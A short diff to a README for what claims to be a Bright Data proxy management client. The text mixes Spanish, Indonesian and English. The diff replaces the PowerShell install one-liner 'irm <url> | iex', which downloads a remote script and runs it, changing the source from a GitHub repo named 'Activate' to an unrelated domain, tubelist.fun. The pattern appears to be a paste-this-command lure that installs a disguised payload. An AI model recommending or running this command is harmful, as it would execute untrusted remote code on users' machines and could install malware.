@@ -17,7 +17,7 @@ Bright Data proporciona un cliente de gestion de proxies para redes residenciale
 Jalankan perintah berikut di PowerShell untuk menginstal:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 #### Supported Proxy Types
